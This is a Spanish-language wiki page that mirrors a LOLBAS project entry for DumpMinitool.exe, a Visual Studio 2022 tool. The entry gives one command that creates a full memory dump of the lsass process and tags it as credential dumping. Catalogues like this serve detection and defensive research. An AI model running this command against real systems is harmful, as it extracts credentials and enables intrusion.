# LOLBAS: DumpMinitool.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Dump`

Dump tool part Visual Studio 2022

## Comandos

### Create memory dump and parse it offline

Dump · priv: Administrator · T1003.001

```cmd
DumpMinitool.exe --file {PATH_ABSOLUTE} --processId 1132 --dumpType Full
```

Creates a memory dump of the lsass process

